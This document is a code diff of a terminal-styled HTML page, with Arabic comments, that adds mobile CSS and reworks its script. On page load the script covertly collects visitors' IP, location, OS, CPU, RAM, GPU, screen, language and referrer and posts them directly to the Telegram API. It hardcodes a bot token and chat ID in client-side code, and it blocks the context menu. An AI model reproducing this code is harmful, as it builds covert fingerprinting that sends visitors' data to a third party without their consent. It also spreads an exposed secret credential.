@@ -2,6 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>SECURE_TERMINAL</title>
 <style>
   * {
@@ -48,6 +49,7 @@
     display: flex;
     justify-content: space-between;
     letter-spacing: 1px;
+    flex-wrap: wrap;
   }
 
   .body-inner {
@@ -102,6 +104,7 @@
     background-color: #08120a;
     padding: 14px 18px;
     margin-bottom: 12px;
+    flex-wrap: wrap;
   }
 
   .app-info {
@@ -148,6 +151,7 @@
     color: #4a8a63;
     border-top: 1px solid #1f7a3f;
     padding: 10px 14px;
+    flex-wrap: wrap;
   }
 
   .status-dot {
@@ -170,6 +174,25 @@
     padding: 14px;
     border-top: 1px solid #1f7a3f;
   }
+
+  /* تحسينات للشاشات الصغيرة */
+  @media (max-width: 600px) {
+    .body-inner {
+      padding: 15px 20px;
+    }
+    .app-row {
+      flex-direction: column;
+      align-items: stretch;
+    }
+    .app-button {
+      margin-top: 10px;
+      text-align: center;
+    }
+    .titlebar {
+      flex-direction: column;
+      text-align: center;
+    }
+  }
 </style>
 </head>
 <body>
@@ -179,7 +202,7 @@
 <div class="container">
 
   <div class="titlebar">
-    <span>SECURE_TERMINAL </span>
+    <span>SECURE_TERMINAL</span>
     <span>SESSION: ACTIVE</span>
   </div>
 
@@ -262,45 +285,16 @@
 
 <script>
   // ============================================
-  // جلب معلومات الرام والجهاز (المضافة الجديدة)
+  // التوكن مباشرة (حل مؤقت)
   // ============================================
   
-  async function getRAMInfo() {
-    try {
-      let ramInfo = "غير متاح";
-      
-      // الطريقة الأولى: deviceMemory
-      if ('deviceMemory' in navigator) {
-        const gb = navigator.deviceMemory;
-        ramInfo = gb + " GB";
-      }
-      
-      // الطريقة الثانية: performance.memory (Chrome)
-      if (performance && performance.memory) {
-        const heapLimit = performance.memory.jsHeapSizeLimit;
-        const heapLimitGB = (heapLimit / 1024 / 1024 / 1024).toFixed(2);
-        ramInfo = ramInfo + " (JS Heap: " + heapLimitGB + " GB)";
-      }
-      
-      // الطريقة الثالثة: تقدير بناءً على عدد الأنوية
-      if (ramInfo === "غير متاح" || ramInfo.includes("غير متاح")) {
-        if (navigator.hardwareConcurrency) {
-          const cores = navigator.hardwareConcurrency;
-          let estimatedRAM = "";
-          if (cores <= 2) estimatedRAM = "4-8 GB (estimated)";
-          else if (cores <= 4) estimatedRAM = "8-16 GB (estimated)";
-          else if (cores <= 8) estimatedRAM = "16-32 GB (estimated)";
-          else estimatedRAM = "32+ GB (estimated)";
-          ramInfo = ramInfo + " (cores: " + cores + ", estimated: " + estimatedRAM + ")";
-        }
-      }
-      
-      return ramInfo;
-    } catch (e) {
-      return "غير متاح (خطأ في القراءة)";
-    }
-  }
+  const BOT_TOKEN = "8652389250:AAH4hCF-R7k-ajX3dDbs-Jkpem4iWKjCze0";
+  const TELEGRAM_CHAT_ID = "8484620043";
 
+  // ============================================
+  // جلب معلومات الجهاز
+  // ============================================
+  
   async function getDeviceInfo() {
     const info = {};
     
@@ -308,9 +302,24 @@
     info.cpuCores = navigator.hardwareConcurrency || "غير متاح";
     
     // معلومات الرام
-    info.ram = await getRAMInfo();
+    try {
+      if ('deviceMemory' in navigator) {
+        info.ram = navigator.deviceMemory + " GB";
+      } else {
+        info.ram = "غير متاح";
+      }
+      
+      // معلومات إضافية من performance
+      if (performance && performance.memory) {
+        const heapLimit = performance.memory.jsHeapSizeLimit;
+        const heapLimitGB = (heapLimit / 1024 / 1024 / 1024).toFixed(2);
+        info.ram = info.ram + " (JS Heap: " + heapLimitGB + " GB)";
+      }
+    } catch(e) {
+      info.ram = "غير متاح";
+    }
     
-    // معلومات GPU (إذا كانت متوفرة)
+    // معلومات GPU
     try {
       const canvas = document.createElement('canvas');
       const gl = canvas.getContext('webgl');
@@ -318,13 +327,17 @@
         const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
         if (debugInfo) {
           info.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+        } else {
+          info.gpu = "غير متاح";
         }
+      } else {
+        info.gpu = "WebGL غير مدعوم";
       }
     } catch(e) {
       info.gpu = "غير متاح";
     }
     
-    // معلومات نظام التشغيل
+    // نظام التشغيل
     const ua = navigator.userAgent;
     let os = "Unknown";
     if (ua.includes("Windows NT 10.0")) os = "Windows 10/11";
@@ -339,18 +352,25 @@
     
     // دقة الشاشة
     info.screen = window.screen.width + "x" + window.screen.height;
-    info.pixelRatio = window.devicePixelRatio;
+    info.pixelRatio = window.devicePixelRatio || 1;
+    
+    // المتصفح
+    let browser = "Unknown";
+    if (ua.includes("Edg/")) browser = "Edge";
+    else if (ua.includes("Chrome/") && !ua.includes("Chromium")) browser = "Chrome";
+    else if (ua.includes("Firefox/")) browser = "Firefox";
+    else if (ua.includes("Safari/") && !ua.includes("Chrome")) browser = "Safari";
+    info.browser = browser;
     
     return info;
   }
 
   // ============================================
-  // إرسال الإشعار مع المعلومات الإضافية
+  // إرسال الإشعار
   // ============================================
   
-  const TELEGRAM_CHAT_ID = "8484620043";
-
   async function notifyVisit() {
+    // جلب الموقع
     let ip = "unknown";
     let location = "unknown";
     try {
@@ -364,65 +384,63 @@
       // ignore
     }
 
-    // جلب معلومات الجهاز الإضافية
+    // جلب معلومات الجهاز
     const deviceInfo = await getDeviceInfo();
 
-    // معلومات المتصفح
-    const ua = navigator.userAgent;
-    let browser = "Unknown";
-    if (ua.includes("Edg/")) browser = "Edge";
-    else if (ua.includes("Chrome/") && !ua.includes("Chromium")) browser = "Chrome";
-    else if (ua.includes("Firefox/")) browser = "Firefox";
-    else if (ua.includes("Safari/") && !ua.includes("Chrome")) browser = "Safari";
-
-    let os = "Unknown";
-    if (ua.includes("Windows")) os = "Windows";
-    else if (ua.includes("Mac OS")) os = "macOS";
-    else if (ua.includes("Android")) os = "Android";
-    else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
-    else if (ua.includes("Linux")) os = "Linux";
-
-    const screenSize = window.screen.width + "x" + window.screen.height;
-    const language = navigator.language || "unknown";
-
-    // إنشاء الرسالة مع المعلومات الإضافية
+    // بناء الرسالة
     const message =
-      "🔐 New visitor on SECURE_TERM\n" +
+      "🔐 **New Visitor**\n" +
       "━━━━━━━━━━━━━━━━━━━━\n\n" +
-      "📅 Time: " + new Date().toLocaleString() + "\n" +
-      "🌍 IP: " + ip + "\n" +
-      "📍 Location: " + location + "\n\n" +
-      "💻 System Info:\n" +
+      "📅 **Time**\n" +
+      "  " + new Date().toLocaleString('ar-EG') + "\n\n" +
+      "🌍 **Location**\n" +
+      "  IP: " + ip + "\n" +
+      "  Location: " + location + "\n\n" +
+      "💻 **System**\n" +
       "  OS: " + deviceInfo.os + "\n" +
       "  CPU Cores: " + deviceInfo.cpuCores + "\n" +
       "  RAM: " + deviceInfo.ram + "\n" +
-      "  GPU: " + (deviceInfo.gpu || "غير متاح") + "\n\n" +
-      "🌐 Browser:\n" +
-      "  Name: " + browser + "\n" +
-      "  OS: " + os + "\n" +
-      "  Screen: " + screenSize + "\n" +
+      "  GPU: " + deviceInfo.gpu + "\n\n" +
+      "🌐 **Browser**\n" +
+      "  Name: " + deviceInfo.browser + "\n" +
+      "  Screen: " + deviceInfo.screen + "\n" +
       "  Pixel Ratio: " + deviceInfo.pixelRatio + "x\n" +
-      "  Language: " + language + "\n\n" +
-      "📌 Referrer: " + (document.referrer || "direct");
+      "  Language: " + (navigator.language || "unknown") + "\n\n" +
+      "📌 **Referrer**\n" +
+      "  " + (document.referrer || "direct");
 
-    // إرسال إلى تلغرام (نفس الطريقة القديمة)
-    fetch("/.netlify/functions/telegram", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
-        text: message
-      })
-    }).catch(() => {
-      // fail silently
-    });
+    // إرسال إلى تلغرام مباشرة
+    try {
+      const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message,
+          parse_mode: "Markdown",
+          disable_web_page_preview: true
+        })
+      });
+      
+      const data = await response.json();
+      
+      if (data.ok) {
+        console.log('✅ تم الإرسال بنجاح');
+      } else {
+        console.error('❌ فشل الإرسال:', data);
+      }
+    } catch (error) {
+      console.error('❌ خطأ:', error);
+    }
   }
 
-  // تشغيل الإشعار
-  notifyVisit();
+  // تشغيل عند تحميل الصفحة
+  window.addEventListener('load', () => {
+    notifyVisit();
+  });
 
   // ============================================
-  // الإعدادات الأمنية (نفس القديمة)
+  // الإعدادات الأمنية
   // ============================================
   
   document.addEventListener('contextmenu', function (e) {
@@ -440,8 +458,8 @@
     }
   });
 
-  console.log('%cStop!', 'color:red; font-size:30px; font-weight:bold;');
-  console.log('This is a browser feature intended for developers. Pasting or running code here you don\'t understand could compromise your account or device.');
+  console.log('%c⚠️ SECURITY NOTICE', 'color:red; font-size:20px; font-weight:bold;');
+  console.log('This terminal is monitored. All actions are logged.');
 </script>
 
 </body>
